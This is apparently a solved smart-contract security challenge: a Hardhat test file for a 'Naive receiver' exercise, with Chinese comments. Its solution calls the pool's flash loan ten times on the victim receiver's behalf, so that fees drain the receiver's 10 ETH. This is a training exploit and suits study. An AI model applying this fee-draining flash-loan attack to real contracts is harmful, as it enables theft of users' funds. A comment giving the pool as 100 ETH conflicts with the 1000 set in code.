import { ethers } from 'hardhat';
import { expect } from 'chai';


describe('[Challenge] Naive receiver', function () {
    let deployer, user, player;
    let pool, receiver;

    // Pool has 1000 ETH in balance，池子里面有100个ETH
    const ETHER_IN_POOL = 1000n * 10n ** 18n;

    // Receiver has 10 ETH in balance，接收者有10个ETH
    const ETHER_IN_RECEIVER = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, player] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        pool = await LenderPoolFactory.deploy();
        // 给池子初始化100个eth
        await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
        const ETH = await pool.ETH();

        expect(await ethers.provider.getBalance(pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await pool.maxFlashLoan(ETH)).to.eq(ETHER_IN_POOL);
        expect(await pool.flashFee(ETH, 0)).to.eq(10n ** 18n);

        receiver = await FlashLoanReceiverFactory.deploy(pool.address);
        await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
        await expect(
            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n ** 18n, "0x")
        ).to.be.reverted;
        expect(
            await ethers.provider.getBalance(receiver.address)
        ).to.eq(ETHER_IN_RECEIVER);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // 因为每次闪电贷都会花1 ether，循环十次就能花光手续费
        for(var i = 0; i < 10; i ++){
            await pool.flashLoan(receiver.address, '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', 0, '0x');
            const recevieBalance = await ethers.provider.getBalance(receiver.address)
            const poolBalance = await ethers.provider.getBalance(pool.address)
            console.log(`receive: ${recevieBalance} pool: ${poolBalance}`);
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // All ETH has been drained from the receiver，所有的ETH都从接收方取出
        expect(
            await ethers.provider.getBalance(receiver.address)
        ).to.be.equal(0);
        expect(
            await ethers.provider.getBalance(pool.address)
        ).to.be.equal(ETHER_IN_POOL + ETHER_IN_RECEIVER);
    });
});